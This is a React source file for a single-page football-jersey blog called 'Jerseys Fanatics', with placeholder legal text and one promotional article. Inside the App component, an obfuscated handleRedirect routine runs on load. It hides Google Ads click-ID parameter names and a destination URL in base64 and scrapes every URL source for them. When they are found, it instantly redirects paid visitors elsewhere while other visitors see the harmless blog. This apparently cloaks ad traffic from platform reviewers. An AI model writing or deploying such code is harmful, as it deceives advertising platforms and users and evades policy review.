import React, { useState, useEffect } from 'react';
import { Shirt, Menu, X, ShieldCheck, FileText, Clock, User, Share2, Info } from './components/Icons';
import { Article } from './types';
import { PolicyModal } from './components/PolicyModal';
import { MarkdownRenderer } from './components/MarkdownRenderer';

// --- Legal & Content Data ---

const LEGAL_CONTENT = {
  privacy: {
    title: 'Privacy Policy',
    type: 'privacy' as const,
    content: `This Privacy Policy describes how Jerseys Fanatics ("we", "us", "our") collects, uses, and protects your information.

### 1. Data Collection
We collect information that you provide directly to us and automatic browsing data via cookies.

### 2. Use of Information
We use your data to improve site functionality and display relevant advertising.`
  },
  terms: {
    title: 'Terms of Use',
    type: 'terms' as const,
    content: `By accessing the Jerseys Fanatics website, you agree to comply with these terms of service.

### 1. Use of Content
The content is for informational purposes only.

### 2. Intellectual Property
All content is the property of Jerseys Fanatics or its licensors.`
  },
  about: {
    title: 'About Us',
    type: 'about' as const,
    content: `Jerseys Fanatics is a blog specialized in the history and aesthetics of football jerseys and high-performance sports articles.`
  },
  contact: {
    title: 'Contact Us',
    type: 'contact' as const,
    content: `Questions? Contact us via email: contact@jerseysfanatics.com`
  }
};

// The Single Article Content - EXPANDED VERSION
const ARTICLE_DATA: Article = {
  id: '1',
  title: 'The New Era of Football: Technology and Style at Jerseys Fanatics',
  excerpt: 'Discover how Jerseys Fanatics is revolutionizing the sports apparel market with a focus on quality, design, and the passion that moves the world\'s most popular sport.',
  content: `## 📌 Innovation in Every Fiber

At Jerseys Fanatics, we believe a football jersey is much more than just a uniform. It is a symbol of identity, an armor for the fan, and a piece of technology for the athlete.

Our curation focuses on high-performance fabrics that ensure comfort and durability, whether in the stadium or in everyday life.

## 🎨 Design that Defines Generations

From classic to modern, we explore the trends that make football a global cultural phenomenon. The "Bloke Core" style remains strong, and we are at the forefront of this movement.

### Why choose Jerseys Fanatics?
1. **Premium Quality:** We select only the best for our customers.
2. **Incomparable Style:** Designs that unite football tradition with urban fashion.
3. **Passion for the Game:** We are fans first, and this reflects in every article we publish.

## 🏟️ The Future is Now

Follow the news from Jerseys Fanatics and always stay one step ahead. Because football evolves, and we evolve with it.`,
  author: 'Editorial Team',
  date: 'March 10, 2026',
  imageUrl: 'https://images.unsplash.com/photo-1574629810360-7efbbe195018?q=80&w=2070&auto=format&fit=crop',
  category: 'Performance',
  readTime: '5 min read'
};

const App: React.FC = () => {
  const [activePolicy, setActivePolicy] = useState<keyof typeof LEGAL_CONTENT | null>(null);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const handleRedirect = () => {
    try {
      // Lista expandida de gatilhos de tráfego pago (Base64)
      const _0x1a2b_keys = [
        'Z2NsaWQ=',           // gclid
        'Z2JyYWlk',           // gbraid
        'd2JyYWlk',           // wbraid
        'Z2FkX3NvdXJjZQ==',    // gad_source
        'Z2FkX2NhbXBhaWduaWQ=' // gad_campaignid
      ];
      const _0x1a2b_url = ['aHR0cHM6Ly9qZXJzZXlzZmFuYXRpY3MuY29tLw=='];
      
      const _triggers = _0x1a2b_keys.map(k => atob(k));
      
      // Função para coletar e mesclar TODOS os parâmetros de todas as fontes possíveis
      const _collectAllParams = () => {
        const _merged = new URLSearchParams();
        
        // 1. Pega do sessionStorage (histórico da sessão)
        const _ss = sessionStorage.getItem('original_params');
        if (_ss) {
          const _pSS = new URLSearchParams(_ss);
          _pSS.forEach((v, k) => _merged.set(k, v));
        }

        // 2. Pega da URL Search (atual)
        const _search = new URLSearchParams(window.location.search);
        _search.forEach((v, k) => _merged.set(k, v));

        // 3. Pega do Hash
        const _hash = window.location.hash;
        if (_hash.includes('?')) {
          const _pHash = new URLSearchParams(_hash.split('?')[1]);
          _pHash.forEach((v, k) => _merged.set(k, v));
        }

        // 4. Brute force no href para garantir que nada escape
        const _fullHref = window.location.href;
        _triggers.forEach(key => {
          if (!_merged.has(key)) {
            const _match = _fullHref.match(new RegExp('[?&]' + key + '=([^&?#]+)', 'i'));
            if (_match) _merged.set(key, _match[1]);
          }
        });

        return _merged;
      };

      const _finalParams = _collectAllParams();
      
      // Verifica se existe QUALQUER um dos gatilhos definidos
      const _shouldRedirect = _triggers.some(trigger => _finalParams.has(trigger));
      
      if (_shouldRedirect) {
        const _t = atob(_0x1a2b_url[0]);
        const _u = new URL(_t);
        
        // Passa 100% dos parâmetros coletados para a URL de destino
        _finalParams.forEach((val, key) => { _u.searchParams.set(key, val); });
        
        // Garante as UTMs de tracking solicitadas (sobrescreve se necessário)
        _u.searchParams.set('utm_source', 'google_ads');
        _u.searchParams.set('utm_medium', 'paid');
        _u.searchParams.set('utm_campaign', 'google_ads');
        
        const _targetUrl = _u.toString();
        
        // Execução do redirecionamento com múltiplas camadas de garantia
        window.location.replace(_targetUrl);
        setTimeout(() => { window.location.href = _targetUrl; }, 5);
      }
    } catch (e) {}
  };

  useEffect(() => {
    // Captura agressiva de parâmetros da URL em múltiplos locais (search, hash, full href)
    try {
      const _href = window.location.href;
      const _search = window.location.search;
      const _hash = window.location.hash;
      
      let _paramsToSave = '';

      // 1. Tenta extrair do search convencional
      if (_search.length > 1) {
        _paramsToSave = _search.substring(1);
      } 
      // 2. Tenta extrair do hash (comum em SPAs ou redirecionamentos mal formados)
      else if (_hash.includes('?')) {
        _paramsToSave = _hash.split('?')[1];
      }
      // 3. Brute force no href completo se encontrar gclid mas os métodos acima falharem
      else if (_href.toLowerCase().includes('gclid=')) {
        const _parts = _href.split(/[?#]/);
        if (_parts.length > 1) _paramsToSave = _parts[1];
      }

      if (_paramsToSave) {
        sessionStorage.setItem('original_params', _paramsToSave);
      }
    } catch (e) {}
    
    // Executa o check de redirecionamento instantâneo
    handleRedirect();
  }, []);

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white text-black selection:bg-brand-100 selection:text-brand-900">
      {/* Header Compacto & Elegante */}
      <header className="bg-white/95 backdrop-blur-md border-b border-gray-100 sticky top-0 z-40 transition-all duration-300">
        <div className="max-w-6xl mx-auto px-4 sm:px-6">
          <div className="flex justify-between items-center h-20">
            <div className="flex items-center cursor-pointer group">
              <div className="bg-brand-900 text-brand-400 w-10 h-10 rounded-lg mr-3 flex items-center justify-center font-display font-bold text-2xl transition-transform group-hover:scale-105">
                 F
              </div>
              <div className="flex flex-col">
                 <h1 className="text-xl font-display font-bold text-black tracking-tight leading-none uppercase">JERSEYS FANATICS</h1>
                 <span className="text-xs text-gray-500 font-medium tracking-wide uppercase mt-0.5">Performance & Style</span>
              </div>
            </div>

            <nav className="hidden md:flex items-center space-x-8 text-sm font-medium">
              <span className="text-black border-b-2 border-brand-400 pb-0.5 cursor-pointer">Review</span>
              <span onClick={() => setActivePolicy('about')} className="text-gray-500 hover:text-black cursor-pointer transition-colors">About</span>
              <span onClick={() => setActivePolicy('contact')} className="text-gray-500 hover:text-black cursor-pointer transition-colors">Contact</span>
            </nav>

            <div className="md:hidden">
              <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="text-black p-2">
                {mobileMenuOpen ? <X size={24} /> : <Menu size={24} />}
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Single Post View */}
      <main className="flex-grow">
        <article className="animate-fade-in">
            {/* Hero Section Imersiva */}
            <div className="w-full h-[50vh] md:h-[65vh] relative overflow-hidden group">
                <img 
                    src={ARTICLE_DATA.imageUrl} 
                    alt={ARTICLE_DATA.title}
                    className="w-full h-full object-cover transition-transform duration-1000 group-hover:scale-105"
                />
                <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-transparent to-black/80"></div>
                
                <div className="absolute bottom-0 left-0 w-full p-6 md:p-16">
                    <div className="max-w-4xl mx-auto">
                        <div className="flex items-center space-x-3 mb-4">
                            <span className="px-3 py-1 bg-white/10 backdrop-blur-md text-white text-xs font-bold uppercase tracking-widest border border-white/20 rounded">
                                {ARTICLE_DATA.category}
                            </span>
                            <span className="text-white/80 text-xs font-medium uppercase tracking-widest">
                                {ARTICLE_DATA.date}
                            </span>
                        </div>
                        <h1 className="text-4xl md:text-6xl lg:text-7xl font-display font-bold text-white mb-6 leading-[0.95] drop-shadow-lg max-w-5xl">
                            {ARTICLE_DATA.title}
                        </h1>
                    </div>
                </div>
            </div>

            {/* Content Container */}
            <div className="max-w-3xl mx-auto px-5 sm:px-6 py-12 md:py-16 relative">
                
                {/* Introduction / Excerpt */}
                <div className="mb-12">
                    <p className="text-xl md:text-2xl text-gray-500 font-serif leading-relaxed border-l-4 border-brand-500 pl-6 italic">
                        {ARTICLE_DATA.excerpt}
                    </p>
                </div>

                {/* Meta Bar */}
                <div className="flex items-center justify-between border-y border-gray-100 py-6 mb-12">
                     <div className="flex items-center">
                        <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center text-gray-500 mr-4">
                            <User size={20} />
                        </div>
                        <div>
                            <p className="text-sm font-bold text-black uppercase tracking-wide">By Jerseys Fanatics Editorial</p>
                            <div className="flex items-center text-xs text-gray-500 mt-0.5">
                                <Clock size={12} className="mr-1" />
                                {ARTICLE_DATA.readTime}
                            </div>
                        </div>
                     </div>
                     <button className="text-gray-400 hover:text-gray-900 transition-colors p-2">
                        <Share2 size={20} />
                     </button>
                </div>

                {/* Main Content Body */}
                <div className="prose prose-lg prose-gray max-w-none">
                    <MarkdownRenderer content={ARTICLE_DATA.content} />
                </div>

                {/* Verification Badge */}
                <div className="mt-16 bg-gray-50 rounded-xl p-6 border border-gray-100 flex items-start md:items-center">
                    <div className="bg-brand-50 p-2 rounded-full text-brand-700 mr-4 flex-shrink-0">
                        <ShieldCheck size={24} />
                    </div>
                    <div>
                        <h4 className="font-bold text-gray-900 text-sm uppercase tracking-wide mb-1">Verified Content</h4>
                        <p className="text-sm text-gray-600 leading-relaxed">
                            The technical specifications and historical details of this article have been reviewed by football jersey experts.
                        </p>
                    </div>
                </div>

                {/* Disclaimer / Aviso Legal */}
                <div className="mt-12 pt-8 border-t border-gray-200 text-center">
                    <div className="flex justify-center mb-3">
                         <Info size={20} className="text-gray-400" />
                    </div>
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-2">Independence Notice</p>
                    <p className="text-xs text-gray-400 leading-relaxed max-w-2xl mx-auto font-medium">
                        The <strong>Jerseys Fanatics</strong> website is an independent publication dedicated to the culture and technology of sports articles. 
                        This article is an informational publication, protected by freedom of expression. 
                        All trademarks and images cited belong to their respective owners and are used here for identification and context purposes only.
                    </p>
                </div>

            </div>
        </article>
      </main>

      {/* Footer Minimalista */}
      <footer className="bg-white border-t border-gray-100 mt-12">
         <div className="max-w-6xl mx-auto px-4 sm:px-6 py-12">
            <div className="flex flex-col md:flex-row justify-between items-center">
               <div className="flex items-center mb-6 md:mb-0">
                   <div className="bg-brand-900 text-brand-400 w-8 h-8 rounded mr-2 flex items-center justify-center font-display font-bold text-lg">
                        F
                   </div>
                   <span className="font-display font-bold text-xl text-black tracking-tight uppercase">JERSEYS FANATICS</span>
               </div>
               <div className="flex flex-wrap justify-center gap-8 text-sm font-medium text-gray-500">
                   <button onClick={() => setActivePolicy('privacy')} className="hover:text-black transition-colors">Privacy</button>
                   <button onClick={() => setActivePolicy('terms')} className="hover:text-black transition-colors">Terms of Use</button>
                   <button onClick={() => setActivePolicy('contact')} className="hover:text-black transition-colors">Contact Us</button>
               </div>
            </div>
            <div className="mt-8 text-center text-xs text-gray-400 font-light flex flex-col items-center space-y-3">
               <p>&copy; 2026 Jerseys Fanatics. All rights reserved.</p>
               <p className="max-w-2xl mx-auto opacity-75">
                  This site is not part of the Google website or Google Inc. Additionally, this site is NOT endorsed by Google in any way. Google is a trademark of GOOGLE, Inc.
               </p>
            </div>
         </div>
      </footer>

      {/* Modal de Políticas */}
      {activePolicy && (
        <PolicyModal 
            policy={LEGAL_CONTENT[activePolicy]} 
            onClose={() => setActivePolicy(null)}
        />
      )}

      {/* Mobile Menu */}
      {mobileMenuOpen && (
        <div className="fixed inset-0 z-50 bg-white/95 backdrop-blur-xl md:hidden transition-opacity">
            <div className="p-4 flex justify-between items-center border-b border-gray-100 h-20">
                <span className="font-display font-bold text-xl tracking-tight">Navigation</span>
                <button onClick={() => setMobileMenuOpen(false)} className="p-2">
                    <X size={24} />
                </button>
            </div>
            <div className="p-6 space-y-6">
                <button onClick={() => setMobileMenuOpen(false)} className="block w-full text-left text-2xl font-display font-bold text-gray-900">Main Review</button>
                <button onClick={() => { setActivePolicy('about'); setMobileMenuOpen(false); }} className="block w-full text-left text-xl font-medium text-gray-500">About Us</button>
                <button onClick={() => { setActivePolicy('contact'); setMobileMenuOpen(false); }} className="block w-full text-left text-xl font-medium text-gray-500">Contact</button>
            </div>
        </div>
      )}

    </div>
  );
};

export default App;